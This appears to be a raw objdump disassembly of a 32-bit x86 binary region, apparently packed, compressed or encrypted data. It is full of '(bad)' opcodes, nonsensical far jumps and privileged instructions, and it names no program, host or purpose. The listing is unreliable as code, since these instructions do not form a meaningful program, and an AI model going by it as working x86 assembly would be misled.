  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	inc    edx
  42b4c1:	push   edx
  42b4c2:	pop    es
  42b4c3:	(bad)  
  42b4c4:	ss retf 
  42b4c6:	add    DWORD PTR [eax],eax
  42b4c8:	test   BYTE PTR [eax],0x0
  42b4cb:	add    BYTE PTR [edx],bl
  42b4cd:	mov    ch,0x3f
  42b4cf:	(bad)  
  42b4d0:	sbb    BYTE PTR [edx+0x2c],ch
  42b4d3:	ins    DWORD PTR es:[edi],dx
  42b4d4:	sub    edx,edx
  42b4d6:	jbe    0x42b4f7
  42b4d8:	test   cl,0x96
  42b4db:	fiadd  DWORD PTR [eax+0xe]
  42b4de:	gs stos DWORD PTR es:[edi],eax
  42b4e0:	ss shl edx,1
  42b4e3:	(bad)  
  42b4e4:	fsubr  DWORD PTR [eax-0x60]
  42b4e7:	iret   
  42b4e8:	jg     0x42b4a2
  42b4ea:	cmp    cl,BYTE PTR [esi]
  42b4ec:	jmp    DWORD PTR [edx-0x23ff3fe6]
  42b4f2:	sub    ah,BYTE PTR [ebp-0x791da394]
  42b4f8:	lds    edx,FWORD PTR [ecx]
  42b4fa:	xchg   ecx,eax
  42b4fb:	jno    0x42b53e
  42b4fd:	pop    ecx
  42b4fe:	daa    
  42b4ff:	leave  
  42b500:	test   cl,ch
  42b502:	cs or  edx,edx
  42b505:	mov    dh,0xde
  42b507:	ud0    esi,ecx
  42b50a:	pop    esi
  42b50b:	push   ds
  42b50c:	rcr    DWORD PTR [edi+0x2db544a2],cl
  42b512:	clc    
  42b513:	mov    al,ds:0x55d2e60e
  42b518:	and    dl,BYTE PTR [esi+0x39a27577]
  42b51e:	aas    
  42b51f:	jae    0x42b573
  42b521:	cmovb  edx,DWORD PTR [ebx+0x58]
  42b525:	test   BYTE PTR [ebx-0x448a923d],ch
  42b52b:	mov    cl,0xb
  42b52d:	cmp    esp,DWORD PTR [ecx-0x6296d217]
  42b533:	fisttp DWORD PTR [ebx-0xd]
  42b536:	pop    DWORD PTR [esi+0x33]
  42b539:	jmp    0xb99c:0xb9cbf86f
  42b540:	mov    dl,0xdc
  42b542:	int    0xa8
  42b544:	cdq    
  42b545:	cmp    eax,0x47fa985
  42b54a:	mov    bh,0xb9
  42b54c:	inc    edx
  42b54d:	shr    BYTE PTR [esi+0x15],cl
  42b550:	ror    BYTE PTR [esi+0x5056a9c1],0x4c
  42b557:	sbb    BYTE PTR [edi+0x44],bh
  42b55a:	cmp    eax,0xeb8dab9d
  42b55f:	pop    es
  42b560:	(bad)  
  42b561:	cmp    eax,0x1432b477
  42b566:	je     0x42b4f9
  42b568:	pop    ds
  42b569:	mov    cs,ebp
  42b56b:	adc    bl,BYTE PTR [eax+0x59]
  42b56e:	sub    BYTE PTR [ebx],bl
  42b570:	cmp    eax,DWORD PTR [esi+eax*8+0x2904d075]
  42b577:	inc    ecx
  42b578:	int    0xac
  42b57a:	xchg   edi,eax
  42b57b:	dec    ebp
  42b57c:	cli    
  42b57d:	call   0x6ba6e3b7
  42b582:	mov    cl,0x97
  42b584:	arpl   WORD PTR ds:0xbe50fb38,ax
  42b58a:	cmp    al,0x3a
  42b58c:	inc    ebx
  42b58d:	nop
  42b58e:	daa    
  42b58f:	dec    esp
  42b590:	test   al,0x62
  42b592:	adc    BYTE PTR [eax+0x2e],0x8b
  42b596:	pop    ss
  42b597:	ss popf 
  42b599:	dec    ebp
  42b59a:	aas    
  42b59b:	js     0x42b600
  42b59d:	ds push edx
  42b59f:	inc    ebx
  42b5a0:	jmp    0x42b549
  42b5a2:	fisub  WORD PTR [ebp*1+0x215ca1b4]
  42b5a9:	add    DWORD PTR [ebp+ebx*1+0x76],edi
  42b5ad:	ret    
  42b5ae:	(bad)  
  42b5af:	cli    
  42b5b0:	stos   DWORD PTR es:[edi],eax
  42b5b1:	and    al,0x1e
  42b5b3:	or     DWORD PTR es:[ebx-0x6a00bba2],edx
  42b5ba:	push   cs
  42b5bb:	add    al,0x7a
  42b5bd:	ss add edi,ecx
  42b5c0:	xchg   ebp,eax
  42b5c1:	jo     0x42b5c3
	...
  42b633:	add    BYTE PTR [esi+edx*1],ah
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    bl,dh
  42b641:	hlt    
  42b642:	lods   al,BYTE PTR ds:[esi]
  42b643:	pop    ebx
  42b644:	sub    al,0xcc
  42b646:	add    DWORD PTR [eax],eax
  42b648:	test   BYTE PTR [eax],0x0
  42b64b:	add    bl,bl
  42b64d:	rol    DWORD PTR ds:[edx+0x67],1
  42b651:	push   ds
  42b652:	sub    edi,ebp
  42b654:	lea    edi,[ecx]
  42b656:	push   0xffffff90
  42b658:	xchg   ebx,eax
  42b659:	add    al,0x10
  42b65b:	inc    ebp
  42b65c:	inc    edi
  42b65d:	(bad)  
  42b65e:	mov    ebp,0x66ed0534
  42b663:	push   edi
  42b664:	inc    BYTE PTR [ebp-0x76aeb210]
  42b66a:	ret    
  42b66b:	push   ebx
  42b66c:	or     esi,ecx
  42b66e:	or     ebx,DWORD PTR [ebx+0x41b203d3]
  42b674:	mov    ah,0xd5
  42b676:	xor    BYTE PTR [edx-0x7e6c3677],ah
  42b67c:	popa   
  42b67d:	fxch   st(3)
  42b67f:	fs js  0x42b640
  42b682:	pushf  
  42b683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b684:	daa    
  42b685:	push   ds
  42b686:	rcr    BYTE PTR [edx],cl
  42b688:	xchg   esp,eax
  42b689:	loope  0x42b642
  42b68b:	dec    esp
  42b68c:	adc    al,0xc4
  42b68e:	shl    BYTE PTR [ecx+0x24],1
  42b691:	jmp    0x2812:0x5610f5f7
  42b698:	fwait
  42b699:	xchg   esp,eax
  42b69a:	xor    DWORD PTR [ebx-0x5ba79416],esp
  42b6a0:	inc    edx
  42b6a1:	pop    ebp
  42b6a2:	das    
  42b6a3:	popa   
  42b6a4:	push   es
  42b6a5:	adc    al,0x7b
  42b6a7:	push   eax
  42b6a8:	xchg   al,dl
  42b6aa:	enter  0x1f3a,0xcc
  42b6ae:	data16 sub dl,BYTE PTR [esi+0x53c82806]
  42b6b5:	jnp    0x42b6cb
  42b6b7:	mov    ch,BYTE PTR [ecx+0x18]
  42b6ba:	mov    fs,WORD PTR [esi-0x7a]
  42b6bd:	push   ebp
  42b6be:	in     al,0x5c
  42b6c0:	sub    BYTE PTR [ebp-0x37],al
  42b6c3:	(bad)  
  42b6c5:	std    
  42b6c6:	addr16 popf 
  42b6c8:	mov    eax,ds:0x7f9574d7
  42b6cd:	stos   BYTE PTR es:[edi],al
  42b6ce:	rcl    DWORD PTR [esi-0x68],1
  42b6d1:	cmp    ebx,DWORD PTR [ecx+0x78af62b8]
  42b6d7:	out    dx,al
  42b6d8:	jno    0x42b6fc
  42b6da:	mov    ah,0xad
  42b6dc:	jmp    0x3d5b6a96
  42b6e1:	in     al,0x2f
  42b6e3:	sbb    BYTE PTR [eax],ch
  42b6e5:	repnz aaa 
  42b6e7:	pop    ss
  42b6e8:	ret    0x1602
  42b6eb:	pop    es
  42b6ec:	sub    bl,BYTE PTR [ebp-0x3551a49f]
  42b6f2:	ja     0x42b6e9
  42b6f4:	push   esi
  42b6f5:	into   
  42b6f6:	(bad)  
  42b6f7:	loopne 0x42b736
  42b6f9:	pop    es
  42b6fa:	iret   
  42b6fb:	xchg   edi,eax
  42b6fc:	jl     0x42b6a5
  42b6fe:	arpl   WORD PTR [eax],bx
  42b700:	fsubr  st,st(7)
  42b702:	sbb    dh,BYTE PTR [ebx+0x2816b995]
  42b708:	sub    al,0x48
  42b70a:	shl    BYTE PTR [edi+0x34],1
  42b70d:	sub    al,BYTE PTR [edi]
  42b70f:	dec    esi
  42b710:	fbld   TBYTE PTR [eax-0x51f0a617]
  42b716:	push   0xdc546100
  42b71b:	push   ebx
  42b71c:	test   BYTE PTR [ebx],bl
  42b71e:	data16 clc 
  42b720:	jmp    0x354d3e02
  42b725:	mov    ebx,0x864632cd
  42b72a:	mov    edi,DWORD PTR [edi-0x6c91d97e]
  42b730:	ret    
  42b731:	jge    0x42b6e4
  42b733:	sar    BYTE PTR ds:0xd0735430,cl
  42b739:	adc    ecx,DWORD PTR [eax]
  42b73b:	out    dx,eax
  42b73c:	sbb    ecx,DWORD PTR [edx+0x176cdd2c]
	...
  42b7b2:	add    BYTE PTR [eax],al
  42b7b4:	mov    ah,BYTE PTR [ebp+0x63]
  42b7b7:	mov    edi,0x75debfef
  42b7bc:	push   0xffffff98
  42b7be:	xor    eax,0x723c5fb
  42b7c3:	stos   BYTE PTR es:[edi],al
  42b7c4:	and    cl,ch
  42b7c6:	add    DWORD PTR [eax],eax
  42b7c8:	test   BYTE PTR [eax],0x0
  42b7cb:	add    cl,dh
  42b7cd:	cwde   
  42b7ce:	outs   dx,BYTE PTR ds:[esi]
  42b7cf:	add    eax,0x82d57b97
  42b7d4:	out    0xd1,al
  42b7d6:	xlat   BYTE PTR ds:[ebx]
  42b7d7:	add    al,0x6f
  42b7d9:	dec    edx
  42b7da:	or     esp,DWORD PTR [ecx+esi*2+0x28]
  42b7de:	inc    edi
  42b7df:	jmp    0x42b7b7
  42b7e1:	test   DWORD PTR [edi-0x77],ebp
  42b7e4:	sbb    dl,BYTE PTR [esi-0x57]
  42b7e7:	add    eax,0x4ee66200
  42b7ec:	rol    DWORD PTR [eax-0x58cad6f2],cl
  42b7f2:	inc    ebp
  42b7f3:	cwde   
  42b7f4:	mov    ebp,DWORD PTR [ecx+0x1d]
  42b7f7:	cmp    al,0xbe
  42b7f9:	jo     0x42b829
  42b7fb:	cli    
  42b7fc:	jns    0x42b7c2
  42b7fe:	adc    DWORD PTR [edi+0x602f1694],esi
  42b804:	call   0x6e8ce4d0
  42b809:	adc    cl,0xe6
  42b80c:	pop    esp
  42b80d:	jbe    0x42b7df
  42b80f:	jmp    0x42b87f
  42b811:	stos   DWORD PTR es:[edi],eax
  42b812:	adc    BYTE PTR [edi-0x57],cl
  42b815:	dec    eax
  42b816:	cmp    dh,cl
  42b818:	xchg   edi,eax
  42b819:	and    BYTE PTR [edi+ebx*4-0x1],bh
  42b81d:	cmp    esp,DWORD PTR [edi]
  42b81f:	mov    al,ds:0xb622a87
  42b824:	arpl   bp,bp
  42b826:	js     0x42b86f
  42b828:	mov    bl,0x87
  42b82a:	jl     0x42b882
  42b82c:	mov    edx,0xe6c2d21f
  42b831:	jge    0x42b885
  42b833:	int3   
  42b834:	xor    BYTE PTR [ebx+0x16],0xab
  42b838:	cmp    dh,BYTE PTR [ecx+0x1]
  42b83b:	ret    0x924
  42b83e:	sahf   
  42b83f:	jo     0x42b86e
  42b841:	ficom  WORD PTR gs:[esp+edi*4-0x7a]
  42b846:	je     0x42b834
  42b848:	pop    es
  42b849:	mov    ebx,0xaf58d521
  42b84e:	jns    0x42b81a
  42b850:	jmp    0x42b816
  42b852:	mov    esp,DWORD PTR [edx+0x60]
  42b855:	sbb    ecx,eax
  42b857:	adc    esi,DWORD PTR [ebp-0x52dba6d]
  42b85d:	mov    ds:0xe9da5a66,al
  42b862:	mov    ah,0x7b
  42b864:	out    0x1,al
  42b866:	xor    DWORD PTR [ebp-0x3f],esp
  42b869:	fstp   TBYTE PTR ds:0xa08d495f
  42b86f:	(bad)  
  42b870:	adc    al,cl
  42b872:	aaa    
  42b873:	cmp    ebx,0x8cf86116
  42b879:	sahf   
  42b87a:	enter  0x1fd3,0xbb
  42b87e:	hlt    
  42b87f:	push   edi
  42b880:	xor    al,0xb0
  42b882:	icebp  
  42b883:	or     al,0x1f
  42b885:	xchg   ecx,eax
  42b886:	pusha  
  42b887:	pop    es
  42b888:	push   esi
  42b889:	push   edx
  42b88a:	mov    eax,0x506c3099
  42b88f:	cmp    eax,0x98ddb860
  42b894:	mov    dl,0xfd
  42b896:	sbb    BYTE PTR [ecx+0x2226ecaa],0xfb
  42b89d:	adc    ecx,0xffffffe0
  42b8a0:	popf   
  42b8a1:	(bad)  [eax+edx*1-0x3980cd14]
  42b8a8:	xor    edx,esp
  42b8aa:	hlt    
  42b8ab:	push   esi
  42b8ac:	and    BYTE PTR [edi],ah
  42b8ae:	gs out 0xfe,al
  42b8b1:	jmp    0xf46de022
  42b8b6:	pusha  
  42b8b7:	push   0x43ea4762
  42b8bc:	dec    edi
  42b8bd:	push   edx
  42b8be:	jg     0x42b931
  42b8c0:	mov    BYTE PTR [esi],bh
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	and    DWORD PTR [ecx-0x11],edi
  42b943:	dec    ecx
  42b944:	sbb    dh,cl
  42b946:	add    DWORD PTR [eax],eax
  42b948:	test   BYTE PTR [eax],0x0
  42b94b:	add    BYTE PTR [eax+0x50],bh
  42b94e:	iret   
  42b94f:	jg     0x42b8d4
  42b951:	int3   
  42b952:	fnstsw WORD PTR [ebx]
  42b954:	stos   DWORD PTR es:[edi],eax
  42b955:	aaa    
  42b956:	jmp    FWORD PTR [edi+0x3e630094]
  42b95c:	mov    ebx,0x89e59afa
  42b961:	inc    ebp
  42b962:	ret    
  42b963:	xchg   edx,eax
  42b964:	jno    0x42b903
  42b966:	iret   
  42b967:	add    al,0x8f
  42b969:	or     esi,esi
  42b96b:	fdivr  QWORD PTR [ecx]
  42b96d:	into   
  42b96e:	cmp    DWORD PTR [eax-0x37],esi
  42b971:	add    eax,0xfe786b42
  42b976:	add    BYTE PTR [ebx-0xf],dl
  42b979:	scas   eax,DWORD PTR es:[edi]
  42b97a:	cmp    DWORD PTR [edi+0x6f],esp
  42b97d:	add    eax,0x1d60a863
  42b982:	into   
  42b983:	jbe    0x42b921
  42b985:	cld    
  42b986:	lock inc edi
  42b988:	cmp    al,bh
  42b98a:	push   esi
  42b98b:	test   al,0xb
  42b98d:	les    esp,FWORD PTR [ecx+0x119c832a]
  42b993:	fldenv [edi]
  42b995:	pop    edi
  42b996:	nop
  42b997:	xchg   edx,eax
  42b998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b999:	ins    BYTE PTR es:[edi],dx
  42b99a:	lods   al,BYTE PTR ds:[esi]
  42b99b:	ins    DWORD PTR es:[edi],dx
  42b99c:	or     ebx,DWORD PTR [ebp+ecx*8+0x6]
  42b9a0:	out    dx,eax
  42b9a1:	sahf   
  42b9a2:	sub    dl,BYTE PTR [esi]
  42b9a4:	add    al,0x6
  42b9a6:	loop   0x42ba25
  42b9a8:	shl    BYTE PTR [esi+0x2f3d5346],0x76
  42b9af:	scas   eax,DWORD PTR es:[edi]
  42b9b0:	inc    ecx
  42b9b1:	mov    cl,0x37
  42b9b3:	and    edx,DWORD PTR ds:0x3a992b11
  42b9b9:	pop    edx
  42b9ba:	ret    0xea2d
  42b9bd:	dec    ecx
  42b9be:	mov    ch,0x5d
  42b9c0:	test   eax,0x44b5dfb9
  42b9c5:	les    esi,FWORD PTR [ecx+0x16]
  42b9c8:	and    edi,ebp
  42b9ca:	pop    ss
  42b9cb:	push   es
  42b9cc:	imul   ebx,DWORD PTR [edi],0xcb9e6e52
  42b9d2:	sbb    BYTE PTR [edi],ah
  42b9d4:	push   es
  42b9d5:	pop    edx
  42b9d6:	jge    0x42b9ab
  42b9d8:	cdq    
  42b9d9:	and    BYTE PTR [ebx+eax*8],ch
  42b9dc:	inc    edx
  42b9dd:	sub    ch,BYTE PTR [ecx-0x53]
  42b9e0:	or     cl,BYTE PTR [ebp-0x41]
  42b9e3:	pop    ebx
  42b9e4:	jb     0x42b9d4
  42b9e6:	loope  0x42b999
  42b9e8:	mov    ecx,0x57b8a016
  42b9ed:	or     DWORD PTR [esi],edx
  42b9ef:	popa   
  42b9f0:	push   0xfffffff4
  42b9f2:	inc    ebp
  42b9f3:	and    edi,DWORD PTR ds:0x7cb1d73b
  42b9f9:	aad    0xf4
  42b9fb:	and    BYTE PTR [ecx-0x2228e0ca],cl
  42ba01:	sbb    al,0x5c
  42ba03:	cwde   
  42ba04:	dec    esp
  42ba05:	push   ebp
  42ba06:	sub    al,BYTE PTR ds:0xa16a131e
  42ba0c:	lahf   
  42ba0d:	lock ds retf 
  42ba10:	cld    
  42ba11:	pop    es
  42ba12:	jmp    DWORD PTR [ebp-0x4d8ad70d]
  42ba18:	hlt    
  42ba19:	xor    DWORD PTR [ecx],0x7bba150e
  42ba1f:	xchg   ecx,eax
  42ba20:	fstp   DWORD PTR [edx]
  42ba22:	sub    eax,0x3a14746f
  42ba27:	repnz xchg esp,eax
  42ba29:	dec    ecx
  42ba2a:	icebp  
  42ba2b:	sti    
  42ba2c:	rol    dl,cl
  42ba2e:	mov    dh,0xba
  42ba30:	pushf  
  42ba31:	stc    
  42ba32:	push   eax
  42ba33:	add    edi,DWORD PTR [edi+0x60]
  42ba36:	mov    DWORD PTR [ebx-0x7e],ecx
  42ba39:	js     0x42b9bc
  42ba3b:	fwait
  42ba3c:	leave  
  42ba3d:	daa    
  42ba3e:	jg     0x42ba36
  42ba40:	enter  0x90,0x0
	...
  42bab4:	ds push cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x36c6434c]
  42bac2:	sahf   
  42bac3:	or     DWORD PTR [esi],0xf60001cf
  42bac9:	add    BYTE PTR [eax],al
  42bacb:	add    BYTE PTR [ebx-0x26],cl
  42bace:	add    eax,0x9948df89
  42bad3:	mov    ds:0xdb527ec9,al
  42bad8:	sbb    eax,0x301f47e3
  42badd:	push   eax
  42bade:	mov    bl,0x40
  42bae0:	ds fcmove st,st(6)
  42bae3:	stos   BYTE PTR es:[edi],al
  42bae4:	xchg   esi,eax
  42bae5:	fbld   TBYTE PTR ds:0x13551799
  42baeb:	xchg   bl,cl
  42baed:	inc    ebx
  42baee:	call   0x6796:0x3af01b4a
  42baf5:	in     al,dx
  42baf6:	mov    esi,0xbda881e4
  42bafb:	fstp   QWORD PTR [edi+edi*4+0x33]
  42baff:	cmp    BYTE PTR [ebx],dl
  42bb01:	push   cs
  42bb02:	icebp  
  42bb03:	mov    dh,0x5c
  42bb05:	mov    esi,0x7697aa89
  42bb0a:	mov    edx,0x790a28ec
  42bb0f:	dec    ebp
  42bb10:	aaa    
  42bb11:	xchg   ebp,eax
  42bb12:	sbb    eax,0xd7125e92
  42bb17:	(bad)  
  42bb18:	lods   eax,DWORD PTR ds:[esi]
  42bb19:	pop    eax
  42bb1a:	call   0x92b065a3
  42bb1f:	dec    esp
  42bb20:	pop    eax
  42bb21:	aaa    
  42bb22:	aas    
  42bb23:	pop    eax
  42bb24:	jmp    0x7856:0x749c0d81
  42bb2b:	outs   dx,BYTE PTR ds:[esi]
  42bb2c:	jp     0x42baef
  42bb2e:	stc    
  42bb2f:	mov    bh,0xd4
  42bb31:	pusha  
  42bb32:	xor    ch,0x9
  42bb35:	mov    ds:0xff70fbbe,eax
  42bb3a:	(bad)  
  42bb3b:	jg     0x42baf3
  42bb3d:	mov    BYTE PTR [edx-0x47b07506],ch
  42bb43:	ds pop eax
  42bb45:	fild   QWORD PTR [edx+0x2400ad09]
  42bb4b:	jecxz  0x42bb8a
  42bb4d:	inc    esi
  42bb4e:	xchg   esp,eax
  42bb4f:	lea    edx,[edi]
  42bb51:	push   es
  42bb52:	push   edi
  42bb53:	ss push ds
  42bb55:	cmp    eax,0xf0534a90
  42bb5a:	fldl2t 
  42bb5c:	mov    eax,0xe0ea9394
  42bb61:	jno    0x42bba8
  42bb63:	es push edi
  42bb65:	jmp    0x42c8:0x47bfbc3f
  42bb6c:	das    
  42bb6d:	push   cs
  42bb6e:	scas   eax,DWORD PTR es:[edi]
  42bb6f:	std    
  42bb70:	test   eax,0x25ceb847
  42bb75:	ja     0x42bb99
  42bb77:	dec    eax
  42bb78:	mov    ah,0xc0
  42bb7a:	scas   eax,DWORD PTR es:[edi]
  42bb7b:	pop    esi
  42bb7c:	pop    es
  42bb7d:	sub    DWORD PTR [ebx+edi*8-0x4f],edx
  42bb81:	gs add esp,ebp
  42bb84:	and    eax,0x45d08c0b
  42bb89:	icebp  
  42bb8a:	inc    ebx
  42bb8b:	(bad)  
  42bb8c:	jns    0x42bbd3
  42bb8e:	pusha  
  42bb8f:	out    0x6c,al
  42bb91:	dec    ecx
  42bb92:	lea    edx,[eax-0x569a3de5]
  42bb98:	scas   al,BYTE PTR es:[edi]
  42bb99:	adc    eax,0x7c243c0e
  42bb9e:	sub    al,0xfa
  42bba0:	push   ecx
  42bba1:	pop    edx
  42bba2:	outs   dx,DWORD PTR ds:[esi]
  42bba3:	popf   
  42bba4:	mov    bh,0xd4
  42bba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bba7:	xor    ebx,DWORD PTR [edx+0x13]
  42bbaa:	cmp    ebx,DWORD PTR [ecx+0x23]
  42bbad:	enter  0x647a,0x4a
  42bbb1:	(bad)  
  42bbb3:	inc    ebp
  42bbb4:	sub    ch,al
  42bbb6:	and    ebp,ecx
  42bbb8:	in     al,0x5e
  42bbba:	ins    DWORD PTR es:[edi],dx
  42bbbb:	int3   
  42bbbc:	leave  
  42bbbd:	mov    edi,0xba8c37b7
	...
  42bc32:	add    BYTE PTR [eax],al
  42bc34:	jmp    0xdf7cd86b
  42bc39:	ds out dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0xc8
  42bc41:	adc    al,0xfc
  42bc43:	and    eax,0x1d004
  42bc48:	test   BYTE PTR [eax],0x0
  42bc4b:	add    BYTE PTR [edx-0x6cb323f6],al
  42bc51:	pop    edx
  42bc52:	cs pop ecx
  42bc54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc55:	test   al,0x36
  42bc57:	mov    ds:0x85f23c18,eax
  42bc5c:	push   esi
  42bc5d:	sti    
  42bc5e:	xchg   ebp,eax
  42bc5f:	push   ebx
  42bc60:	or     eax,0xfac4af4d
  42bc65:	xchg   ebp,eax
  42bc66:	adc    DWORD PTR [ecx-0x78],ebx
  42bc69:	repz adc eax,DWORD PTR [ebp-0x19b03afe]
  42bc70:	lods   al,BYTE PTR ds:[esi]
  42bc71:	pop    ebx
  42bc72:	adc    eax,0x431a1c7a
  42bc77:	xor    ah,BYTE PTR [ebx+0x2f]
  42bc7a:	cmp    edi,DWORD PTR [edx]
  42bc7c:	inc    edx
  42bc7d:	jbe    0x42bc09
  42bc7f:	lds    edi,FWORD PTR [edx-0x10ad656d]
  42bc85:	dec    eax
  42bc86:	pop    ecx
  42bc87:	mov    al,ds:0x99a8dd21
  42bc8c:	jp     0x42bc70
  42bc8e:	sub    ah,BYTE PTR [esi]
  42bc90:	cwde   
  42bc91:	and    BYTE PTR [eax-0x2f],ah
  42bc94:	sbb    al,0xd9
  42bc96:	xchg   ecx,eax
  42bc97:	aam    0xd8
  42bc99:	pop    es
  42bc9a:	adc    eax,0x4db723de
  42bc9f:	fcomp  QWORD PTR [ebp+ebx*8+0x163f016f]
  42bca6:	xchg   esp,ecx
  42bca8:	lds    ecx,FWORD PTR [ebp-0x9]
  42bcab:	ss jg  0x42bd0b
  42bcae:	cs sub BYTE PTR gs:[edx-0x1a],dl
  42bcb3:	xchg   ah,dh
  42bcb5:	add    al,0x1b
  42bcb7:	daa    
  42bcb8:	adc    eax,0xcd6be780
  42bcbd:	pop    edi
  42bcbe:	mov    ds:0x88aa78e3,eax
  42bcc3:	cmp    bh,ch
  42bcc5:	push   eax
  42bcc6:	or     eax,0xeeaa069d
  42bccb:	shl    ecx,cl
  42bccd:	jno    0x42bd03
  42bccf:	ins    BYTE PTR es:[edi],dx
  42bcd0:	push   edi
  42bcd1:	cmp    eax,0x7017e347
  42bcd6:	sub    bh,BYTE PTR [ebp-0x316f301a]
  42bcdc:	xor    al,0x85
  42bcde:	jp     0x42bcf7
  42bce0:	fwait
  42bce1:	(bad)  
  42bce2:	and    eax,0x1116994e
  42bce7:	scas   eax,DWORD PTR es:[edi]
  42bce8:	and    DWORD PTR [edi],0x6468f5b4
  42bcee:	cmp    edi,edi
  42bcf0:	fwait
  42bcf1:	jmp    0x75ba0fb8
  42bcf6:	pop    ecx
  42bcf7:	jb     0x42bcec
  42bcf9:	jmp    0x4253:0xf4b6ae48
  42bd00:	jae    0x42bd07
  42bd02:	xchg   ebp,eax
  42bd03:	das    
  42bd04:	xlat   BYTE PTR ds:[ebx]
  42bd05:	js     0x42bd67
  42bd07:	inc    ebp
  42bd08:	xchg   edx,esp
  42bd0a:	jl     0x42bd65
  42bd0c:	push   esp
  42bd0d:	mov    dh,0xe8
  42bd0f:	jmp    0x6796744d
  42bd14:	push   ecx
  42bd15:	push   edx
  42bd16:	outs   dx,BYTE PTR ds:[esi]
  42bd17:	jmp    0x696319ce
  42bd1c:	pop    ss
  42bd1d:	pop    edx
  42bd1e:	sbb    ah,BYTE PTR [eax]
  42bd20:	jl     0x42bcae
  42bd22:	sbb    al,BYTE PTR [ecx]
  42bd24:	stc    
  42bd25:	xchg   ebp,eax
  42bd26:	mov    ecx,DWORD PTR [esi+0x3b13e336]
  42bd2c:	fcomp  QWORD PTR [ecx+0x798d7e45]
  42bd32:	jp     0x42bd7a
  42bd34:	fsub   st(5),st
  42bd36:	es inc edi
  42bd38:	sbb    BYTE PTR [eax-0x41],ch
  42bd3b:	addr16 out dx,eax
  42bd3d:	adc    esi,DWORD PTR [ebp-0x67]
  42bd40:	mov    ebp,0x95
	...
  42bdb1:	add    BYTE PTR [eax],al
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	jnp    0x42bd51
  42bdc2:	iret   
  42bdc3:	mov    eax,0x1d0fa
  42bdc8:	test   BYTE PTR [eax],0x0
  42bdcb:	add    ah,al
  42bdcd:	fiadd  DWORD PTR [esi+0x679e0ccd]
  42bdd3:	(bad)  
  42bdd4:	out    dx,al
  42bdd5:	cs inc esp
  42bdd7:	adc    eax,0x79d5f334
  42bddc:	dec    ebp
  42bddd:	pop    esp
  42bdde:	sbb    bh,0x2
  42bde1:	pop    ebp
  42bde2:	aad    0x3b
  42bde4:	dec    ebx
  42bde5:	sbb    dl,BYTE PTR [ebp-0x5d]
  42bde8:	aas    
  42bde9:	dec    esp
  42bdea:	mov    dl,BYTE PTR [edx]
  42bdec:	inc    ecx
  42bded:	mov    al,ds:0xa4446f93
  42bdf2:	scas   al,BYTE PTR es:[edi]
  42bdf3:	pop    edx
  42bdf4:	jle    0x42bd7a
  42bdf6:	mov    al,ds:0xe68a74de
  42bdfb:	mov    cl,0x62
  42bdfd:	sbb    cl,al
  42bdff:	mul    BYTE PTR [edx-0x4d50b45]
  42be05:	dec    edx
  42be06:	push   esp
  42be07:	mov    edx,0xd0601355
  42be0c:	jnp    0x42bd92
  42be0e:	add    al,0x70
  42be10:	xor    ch,dh
  42be12:	nop
  42be13:	cld    
  42be14:	add    al,BYTE PTR [edi-0x80]
  42be17:	les    edi,FWORD PTR [ebx-0x5cdf59da]
  42be1d:	test   eax,0x751b017c
  42be22:	das    
  42be23:	stc    
  42be24:	(bad)  
  42be25:	sub    ebx,esp
  42be27:	jmp    FWORD PTR [ecx]
  42be29:	add    edi,DWORD PTR [edi-0x80]
  42be2c:	fimul  WORD PTR [ebp+0x40]
  42be2f:	mov    bh,0xe9
  42be31:	retf   0xa10d
  42be34:	aad    0xfe
  42be36:	popa   
  42be37:	pop    edx
  42be38:	mov    bh,0x35
  42be3a:	mov    esp,0x6a6a6612
  42be3f:	cmp    eax,0xb01bc00a
  42be44:	adc    al,dl
  42be46:	pop    edi
  42be47:	imul   edx,DWORD PTR [edx-0x18a15caf],0x42af0084
  42be51:	das    
  42be52:	nop
  42be53:	adc    eax,ebp
  42be55:	es out 0x3e,al
  42be58:	jae    0x42bed6
  42be5a:	mov    eax,ds:0x43c6c072
  42be5f:	push   edx
  42be60:	call   0x8e89:0xbbd926c8
  42be67:	std    
  42be68:	mov    eax,ds:0xad725540
  42be6d:	mov    ch,0x8b
  42be6f:	outs   dx,DWORD PTR ds:[esi]
  42be70:	hlt    
  42be71:	push   cs
  42be72:	aaa    
  42be73:	test   DWORD PTR [edx],eax
  42be75:	jo     0x42be59
  42be77:	daa    
  42be78:	mov    DWORD PTR [esp+ebp*2-0x37],edx
  42be7c:	leave  
  42be7d:	div    DWORD PTR [ebx]
  42be7f:	push   esp
  42be80:	stc    
  42be81:	lock icebp 
  42be83:	push   es
  42be84:	ss cmp bl,al
  42be87:	stos   BYTE PTR es:[edi],al
  42be88:	xchg   esp,eax
  42be89:	int3   
  42be8a:	pop    esp
  42be8b:	mov    es,WORD PTR gs:[ecx-0x18]
  42be8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be90:	rcl    BYTE PTR [esp+ecx*2-0x639ee7cd],1
  42be97:	jo     0x42bebc
  42be99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be9a:	push   es
  42be9b:	mov    ds:0xc20d9fef,al
  42bea0:	std    
  42bea1:	sbb    DWORD PTR [edx-0x32b62519],eax
  42bea7:	jle    0x42bef5
  42bea9:	stos   DWORD PTR es:[edi],eax
